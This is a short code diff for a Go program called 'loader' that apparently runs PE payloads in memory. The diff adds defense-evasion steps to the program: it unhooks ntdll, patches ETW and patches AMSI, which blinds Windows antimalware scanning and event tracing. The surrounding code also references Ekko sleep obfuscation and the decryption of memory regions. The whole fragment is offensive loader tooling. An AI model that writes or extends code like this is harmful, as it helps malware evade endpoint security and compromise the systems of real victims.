@@ -10,11 +10,18 @@ import (
 	"loader/pkg/net"
 	"loader/pkg/wrappers"
 	"loader/pkg/ekko"
+	"loader/pkg/patch"
+	"syscall"
 )
 
 func main() {
+	syscall.NewLazyDLL("amsi.dll")
 	winapi.UnhookNtdll()
-
+	patch.ETW()
+	err := patch.AMSI()
+	if err != nil {
+		log.Fatalf("[ERROR] Failed to patch AMSI: %v\n", err)
+	}
 
 	var (
 		uPE       = flag.Bool("pe", false, "Load and execute PE file")
@@ -75,7 +82,6 @@ func main() {
 		log.Fatalf("[ERROR] Failed to decrypt memory region: %v\n", err)
 	}
 
-	winapi.ApplyCriticalPatches()
 	if *uPE {
 		err := pe.LoadPEFromBytes(fileBytes)
 		if err != nil {
